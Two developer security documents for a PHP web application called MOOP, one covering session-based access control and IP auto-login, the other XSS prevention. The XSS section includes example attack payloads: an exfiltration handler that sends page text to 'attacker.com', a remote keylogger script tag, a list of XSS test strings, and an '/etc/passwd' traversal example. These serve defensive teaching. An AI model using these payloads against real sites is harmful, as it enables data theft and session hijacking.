# Access Control Security Implementation

## Overview
This document describes the secure access control system implemented to prevent unauthorized access escalation.

## Security Vulnerability Fixed

### Previous Issue
- `access_group` was only a display variable, not validated on protected pages
- Users could potentially manipulate URL parameters or session data to gain unauthorized access
- No centralized access control logic

### Solution Implemented
- Centralized access control in `access_control.php`
- Session-based authentication with `access_level` stored securely in session
- Automatic login for IP-based users with proper session management
- Access validation on all protected pages

## Access Levels

1. **Public** - Default access, no authentication required
2. **Collaborator** - Logged-in users with specific organism access
3. **Admin** - Logged-in users with admin role
4. **ALL** - IP-based users from authorized IP range (127.0.0.11)

## How It Works

### 1. Centralized Access Control (`access_control.php`)
All pages now include this file which:
- Checks visitor IP and auto-logs in authorized IP users
- Provides helper functions to read access data from `$_SESSION` (single source of truth)
- Provides `has_access()` and `require_access()` functions for access validation

### 2. IP-Based Auto-Login
Users from IP range 127.0.0.11 are automatically:
- Logged in with username "IP_USER_{ip}"
- Assigned `access_level` = 'ALL'
- Given access to all pages and data
- Protected from URL parameter manipulation

### 3. Regular User Login
Through `login.php`:
- Validates username/password
- Sets `access_level` = 'Admin' or 'Collaborator' based on role
- Stores user-specific access permissions in session

### 4. Page Protection
Each protected page:
- Includes `access_control.php` at the top
- Calls `has_access()` or `require_access()` to validate access
- Redirects unauthorized users to access_denied.php

## Access Helper Functions

The `access_control.php` file provides the following helper functions to securely access session data:

```php
// Get current access level from session
get_access_level()  // Returns: 'Public', 'Collaborator', 'Admin', or 'ALL'

// Get current user's resource access list
get_user_access()   // Returns: array of organisms/resources user can access

// Check if user is logged in
is_logged_in()      // Returns: true/false

// Get currently logged-in username
get_username()      // Returns: username string
```

These functions always read from `$_SESSION` (the authoritative source) rather than relying on cached global variables, ensuring access checks are always based on current session state.

## Session-Based Flow

### Complete Access Control Flow

```
login.php
  └─> Validates username/password
  └─> Sets $_SESSION["logged_in"] = true
  └─> Sets $_SESSION["username"] = username
  └─> Sets $_SESSION["access"] = user_access_array
  └─> Sets $_SESSION["role"] = 'admin' or null
  └─> Sets $_SESSION["access_level"] = 'Admin' or 'Collaborator'
  
header.php
  └─> Includes access_control.php
      └─> Defines helper functions that read from $_SESSION:
          ├─ is_logged_in()       → reads $_SESSION["logged_in"]
          ├─ get_access_level()   → reads $_SESSION["access_level"]
          ├─ get_user_access()    → reads $_SESSION["access"]
          └─ get_username()       → reads $_SESSION["username"]
      
toolbar.php (included by header.php)
  └─> Uses is_logged_in() helper
  └─> Uses $_SESSION['role'] directly for admin check
  └─> Displays Login/Logout buttons based on fresh session state
  
Protected pages (admin/*, tools/display/*, tools/extract/*)
  └─> Include access_control.php
  └─> Call has_access() function
      └─> has_access() calls helpers for fresh reads:
          ├─ get_access_level()
          └─ get_user_access()
  └─> Validate against protected resources
  
admin_access_check.php (called by all admin pages)
  └─> Validates admin access:
      ├─ is_logged_in() → check session exists
      ├─ get_username() → get current user
      ├─ Check user role in JSON file
      └─ get_access_level() → validate is 'Admin' (not 'ALL')
  └─> Blocks if any check fails (403 Forbidden)

logout.php
  └─> Calls session_destroy()
  └─> Clears all session data
  └─> Redirects to login
```

### Key Security Properties

✅ **Single Source of Truth:** `$_SESSION` only
- All access checks read from session
- No cached global variables
- No stale data possible

✅ **Fresh Reads on Every Check**
- Helper functions call `$_SESSION` directly
- No per-page initialization cache
- Access changes take effect immediately

✅ **Defense in Depth**
- login.php: Sets access level based on user role
- admin_access_check.php: Re-validates against JSON + session
- toolbar.php: Uses current session for UI
- All layers independent and consistent

✅ **No Parameter Injection**
- Access level never read from GET/POST
- Only from `$_SESSION` (server-side secure)
- URL parameters have no effect

## Usage Examples

### Protect a Page
```php
<?php
include_once __DIR__ . '/access_control.php';

// Require collaborator access
require_access('Collaborator');

// Or check for specific organism access
if (!has_access('Collaborator', $organism_name)) {
    header("Location: /index.php");
    exit;
}
?>
```

### Check Access in Code
```php
if (has_access('ALL')) {
    // Show all data
} elseif (has_access('Admin')) {
    // Show admin features
} elseif (has_access('Collaborator', 'organism_name')) {
    // Show specific organism data
}
```

## Security Benefits

1. **Session-Based Single Source of Truth** - All access checks read directly from `$_SESSION`, never from cached globals
2. **No URL Parameter Manipulation** - Access level is stored in session, not in URLs
3. **No Stale Cache Issues** - Helper functions always read fresh from `$_SESSION`
4. **Consistent Validation** - All pages use the same access control logic
5. **IP-Based Auto-Login** - Seamless access for authorized IP users without compromising security
6. **Granular Control** - Each page can check for specific resource access
7. **Admin Protection** - Admin panel validates both user role and access level, rejecting IP-based 'ALL' access

## Configuration

To modify the authorized IP range, edit `access_control.php`:

```php
$all_access_start_ip = ip2long("127.0.0.11");
$all_access_end_ip   = ip2long("127.0.0.11");
```

For a range like 10.0.0.1 to 10.0.0.255:
```php
$all_access_start_ip = ip2long("10.0.0.1");
$all_access_end_ip   = ip2long("10.0.0.255");
```

## Files Modified

- `/moop/access_control.php` - NEW centralized access control
- `/moop/index.php` - Uses access_control.php
- `/moop/login.php` - Sets access_level in session
- `/moop/tools/display/groups_display.php` - Protected with access validation
- `/moop/tools/display/organism_display.php` - Protected with access validation
- `/moop/admin/admin_header.php` - Enhanced admin protection

## Testing

1. **Test IP-based access**: Access from 127.0.0.11 should auto-login with ALL access
2. **Test regular login**: Login with credentials should work normally
3. **Test URL manipulation**: Adding `?access_group=ALL` should have no effect
4. **Test protected pages**: Accessing organisms without permission should redirect
5. **Test admin panel**: Only admin users should access admin pages (not IP-based ALL users)
# MOOP Security: Input Validation & XSS Prevention

**Last Updated:** January 25, 2026

---

## Overview

MOOP implements multiple layers of input validation and output escaping to prevent security vulnerabilities, particularly **Cross-Site Scripting (XSS)** attacks.

---

## What is XSS (Cross-Site Scripting)?

### Definition
XSS is a security vulnerability where an attacker injects malicious JavaScript code into a web page that gets executed in other users' browsers.

### Real-World Example

**Without XSS protection (VULNERABLE):**
```php
// User enters: <script>alert('hacked')</script>
echo "Welcome, " . $_GET['name'];
// Output: Welcome, <script>alert('hacked')</script>
// Result: Script RUNS in the browser ❌ DANGEROUS
```

**With XSS protection (SAFE):**
```php
// Same malicious input: <script>alert('hacked')</script>
echo "Welcome, " . htmlspecialchars($_GET['name']);
// Output: Welcome, &lt;script&gt;alert('hacked')&lt;/script&gt;
// Result: Displays as text, script doesn't run ✅ SAFE
```

### Attack Scenarios

**Scenario 1: Session Hijacking**
```
Attacker posts: <script>fetch('/steal-session')</script>
↓
Other users visit the page
↓
Script runs in their browser
↓
Their session cookie is stolen
↓
Attacker can impersonate them
```

**Scenario 2: Data Exfiltration**
```
Attacker creates feature with name: <img src=x onerror="fetch('attacker.com?data='+document.body.innerText)">
↓
Admin views the feature
↓
Script runs and sends page content to attacker
↓
Sensitive data leaked
```

**Scenario 3: Malware Distribution**
```
Attacker posts: <script src="http://malware.com/keylogger.js"></script>
↓
Users visit page
↓
Keylogger installed in their browser
↓
Login credentials captured
```

---

## How MOOP Prevents XSS

### 1. Output Escaping with htmlspecialchars()

**The Core Defense:**

All user-controlled data displayed in HTML is escaped using `htmlspecialchars()`:

```php
// Convert dangerous characters:
// < → &lt;
// > → &gt;
// & → &amp;
// " → &quot;
// ' → &#039;
```

**Examples in MOOP codebase:**

**Feature Detail Page** (tools/pages/parent.php):
```php
// Line 221
<?= htmlspecialchars($feature_uniquename) ?>

// Line 282
<em><?= htmlspecialchars($genus) ?> <?= htmlspecialchars($species) ?></em>

// Line 286
<?= htmlspecialchars($common_name) ?>
```

**Annotation Table** (lib/parent_functions.php):
```php
// Line 188
$hit_id = htmlspecialchars($row['annotation_accession']);
$hit_description = htmlspecialchars($row['annotation_description']);
$annotation_source = htmlspecialchars($row['annotation_source_name']);

// Line 201
$html .= "<td><a href=\"" . htmlspecialchars($hit_id_link) . "\" target=\"_blank\">" . $hit_id . "</a></td>";
```

**Organism Display** (lib/display_functions.php):
```php
echo "<h2>" . htmlspecialchars($organism_name) . "</h2>";
```

### 2. Input Validation with Prepared Statements

**For Database Queries:**

All database access uses prepared statements to prevent SQL injection (which could be combined with XSS):

```php
// SAFE - uses parameterized query
$stmt = $db->prepare("SELECT * FROM feature WHERE feature_uniquename = ?");
$stmt->execute([$uniquename]);

// DANGEROUS - never do this
$query = "SELECT * FROM feature WHERE feature_uniquename = '" . $uniquename . "'";
$db->query($query);  // ❌ SQL injection vulnerability
```

### 3. URL Parameter Escaping

**For URLs in HTML attributes:**

```php
// SAFE - urlencode() prevents XSS in URL parameters
<a href="/moop/tools/organism.php?organism=<?= urlencode($organism_name) ?>">

// DANGEROUS - without urlencode
<a href="/moop/tools/organism.php?organism=<?= $organism_name ?>">
// If organism contains quotes/special chars, could break HTML
```

### 4. JSON Output Escaping

**For JSON responses in AJAX:**

```php
// SAFE - json_encode() handles escaping
header('Content-Type: application/json');
echo json_encode(['message' => $user_input]);

// DANGEROUS - raw string interpolation
echo '{"message": "' . $user_input . '"}';  // ❌ Could break JSON structure
```

---

## Where XSS Protection is Implemented

### Display Locations (High Priority)

| Location | Risk | Protection |
|----------|------|-----------|
| Feature names/descriptions | HIGH | `htmlspecialchars()` |
| Annotation data | HIGH | `htmlspecialchars()` |
| User input in forms | HIGH | `htmlspecialchars()` |
| Search results | HIGH | `htmlspecialchars()` |
| Error messages | HIGH | `htmlspecialchars()` |
| URLs in links | MEDIUM | `urlencode()` or `htmlspecialchars()` |
| Configuration values | MEDIUM | `htmlspecialchars()` |
| Admin panel forms | HIGH | `htmlspecialchars()` |

### Code Patterns

**Pattern 1: Simple text display**
```php
// ✅ CORRECT
<?= htmlspecialchars($data) ?>

// ❌ WRONG
<?= $data ?>
```

**Pattern 2: HTML attributes**
```php
// ✅ CORRECT
<a href="<?= htmlspecialchars($url) ?>">Link</a>

// ❌ WRONG
<a href="<?= $url ?>">Link</a>
```

**Pattern 3: JavaScript data**
```php
// ✅ CORRECT (PHP-generated JS with data)
<script>
const userId = <?= json_encode($user_id) ?>;
const userName = <?= json_encode($user_name) ?>;
</script>

// ❌ WRONG (direct interpolation)
<script>
const userName = "<?= $user_name ?>";  // Could break JS syntax
</script>
```

**Pattern 4: Building HTML strings**
```php
// ✅ CORRECT
$html .= "<td>" . htmlspecialchars($value) . "</td>";

// ❌ WRONG
$html .= "<td>" . $value . "</td>";
```

---

## Testing for XSS Vulnerabilities

### Test Payloads

Use these test inputs to verify XSS protection:

```
Basic script:
<script>alert('XSS')</script>

Event handler:
<img src=x onerror="alert('XSS')">

Encoded script:
<img src=x onerror="alert('XSS')">

Quote breaking:
" onload="alert('XSS')

Single quote:
' onload='alert("XSS")

Data URI:
<img src="data:text/html,<script>alert('XSS')</script>">

SVG vector:
<svg onload="alert('XSS')">
```

### Manual Testing

1. **Search feature by name:**
   - Enter: `<script>alert('XSS')</script>`
   - Expected: Script tag displays as text, no alert
   - If alert appears: ❌ VULNERABILITY

2. **Add annotation:**
   - Enter description: `<img src=x onerror="alert('XSS')">`
   - View feature page
   - Expected: HTML displays as text
   - If alert appears: ❌ VULNERABILITY

3. **User login with special characters:**
   - Username: `test" onload="alert('XSS')`
   - Expected: Displayed safely in session/page
   - If alert appears: ❌ VULNERABILITY

---

## Defense-in-Depth Strategy

MOOP uses **layered security** (defense-in-depth):

```
Layer 1: Input Validation
         ↓ (check for dangerous patterns)
Layer 2: Input Sanitization
         ↓ (remove/encode dangerous chars)
Layer 3: Output Escaping
         ↓ (htmlspecialchars, json_encode)
Layer 4: Content Security Policy (CSP)
         ↓ (browser-level protection - if configured)
Result: Multiple defenses against XSS
```

---

## Related Security Practices

### 1. Prepared Statements (SQL Injection Prevention)
Prevents attackers from modifying SQL queries by injecting code.

```php
// ✅ SAFE
$stmt = $db->prepare("SELECT * FROM feature WHERE id = ?");
$stmt->execute([$id]);

// ❌ VULNERABLE
$result = $db->query("SELECT * FROM feature WHERE id = " . $id);
```

### 2. Session Security
- Secure session tokens (PHP native)
- HttpOnly flag prevents JavaScript access to cookies
- Secure flag (HTTPS only) if using SSL
- SameSite attribute prevents CSRF attacks

### 3. Password Security
- Bcrypt hashing (not plaintext)
- Password verification: `password_verify($input, $hash)`

```php
// ✅ SAFE
if (password_verify($_POST['password'], $stored_hash)) {
    // Login successful
}

// ❌ DANGEROUS
if ($_POST['password'] === $plaintext_password) {
    // Login successful
}
```

### 4. Error Handling
- Sensitive errors logged (not shown to users)
- Generic errors displayed to prevent information leakage

```php
// ✅ SAFE
try {
    $db->query($query);
} catch (Exception $e) {
    error_log($e->getMessage());  // Log detailed error
    echo "Database error occurred";  // Generic message to user
}

// ❌ DANGEROUS
} catch (Exception $e) {
    echo $e->getMessage();  // Leaks sensitive info
}
```

---

## Best Practices for Developers

### Rule 1: Always Escape Output
```php
// When displaying any user-controlled data:
<?= htmlspecialchars($user_data) ?>
```

### Rule 2: Use Prepared Statements
```php
// For all database queries with variables:
$stmt = $db->prepare("SELECT * FROM table WHERE col = ?");
$stmt->execute([$variable]);
```

### Rule 3: Encode for Context
- **HTML context:** `htmlspecialchars()`
- **URL context:** `urlencode()` or `rawurlencode()`
- **JSON context:** `json_encode()`
- **CSS context:** Use CSS escaping or avoid user input
- **JavaScript context:** Use `json_encode()` for data

### Rule 4: Validate Input
```php
// Check input type/format before processing
if (!is_numeric($id)) {
    die("Invalid ID");
}

if (strlen($name) > 255) {
    die("Name too long");
}
```

### Rule 5: Use Security Headers (Optional but Recommended)
```php
// In head-resources.php or main entry point:
header("X-Content-Type-Options: nosniff");  // Prevent MIME-type sniffing
header("X-Frame-Options: SAMEORIGIN");      // Prevent clickjacking
header("X-XSS-Protection: 1; mode=block");   // Browser XSS protection
header("Referrer-Policy: strict-origin-when-cross-origin");
```

---

## Common Mistakes (What NOT to Do)

### ❌ Mistake 1: Forgetting htmlspecialchars()
```php
// WRONG
echo "<h1>" . $title . "</h1>";

// RIGHT
echo "<h1>" . htmlspecialchars($title) . "</h1>";
```

### ❌ Mistake 2: Using strip_tags() for Security
```php
// WRONG - strip_tags is for removing HTML, not for security
$safe = strip_tags($user_input);

// RIGHT
$safe = htmlspecialchars($user_input);
```

### ❌ Mistake 3: Double Escaping
```php
// WRONG - escapes twice (data displays wrong)
echo htmlspecialchars(htmlspecialchars($data));

// RIGHT
echo htmlspecialchars($data);
```

### ❌ Mistake 4: Using Addslashes Instead of Prepared Statements
```php
// WRONG - addslashes is not for SQL injection prevention
$safe = addslashes($user_input);
$db->query("SELECT * WHERE name = '$safe'");

// RIGHT - use prepared statements
$stmt = $db->prepare("SELECT * WHERE name = ?");
$stmt->execute([$user_input]);
```

### ❌ Mistake 5: Trusting User-Supplied File Names
```php
// WRONG - file name could contain ../../../etc/passwd
$file = $_FILES['upload']['name'];
readfile("/uploads/" . $file);

// RIGHT - generate safe file name or validate
$file = uniqid() . '_' . basename($_FILES['upload']['name']);
$file = preg_replace('/[^a-zA-Z0-9._-]/', '', $file);
readfile("/uploads/" . $file);
```

---

## Checklist for Reviewing Code

When reviewing MOOP code, check:

- [ ] All `echo` statements with variables use `htmlspecialchars()`?
- [ ] All database queries use prepared statements?
- [ ] All URLs in href attributes are properly encoded?
- [ ] All JSON responses use `json_encode()`?
- [ ] Error messages don't leak sensitive information?
- [ ] File operations validate/sanitize file paths?
- [ ] User input is validated for length/type before processing?
- [ ] No hardcoded passwords or API keys in code?
- [ ] Sessions use secure configuration?

---

## Resources

- **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **PHP htmlspecialchars():** https://www.php.net/manual/en/function.htmlspecialchars.php
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **PHP Prepared Statements:** https://www.php.net/manual/en/pdo.prepared-statements.php

---

## Summary

XSS is prevented in MOOP through:
1. **Output escaping** with `htmlspecialchars()` on all displayed data
2. **Prepared statements** for all database queries
3. **Input validation** to reject invalid data early
4. **Proper encoding** for context (HTML, URL, JSON)
5. **Error handling** that doesn't leak sensitive information

This multi-layered approach prevents attackers from injecting and executing malicious code in MOOP.

---

**For security questions or concerns, contact:** [Admin contact information]
